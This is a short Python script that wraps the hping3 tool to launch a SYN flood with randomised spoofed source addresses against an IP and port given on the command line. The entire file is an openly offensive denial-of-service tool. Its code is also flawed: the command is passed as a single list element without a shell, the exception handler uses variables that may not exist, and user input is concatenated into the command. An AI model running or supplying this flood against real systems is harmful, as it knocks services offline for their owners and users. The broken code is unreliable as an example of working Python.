import subprocess
import sys

targetIp = sys.argv[1]
targetPort = sys.argv[2]

try:
    process = subprocess.Popen(['sudo hping3 ' + targetIp + ' -q -n -d 120 -S -p ' + targetPort + '  --flood --rand-source'],
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
except KeyboardInterrupt:
    print (stdout, stderr)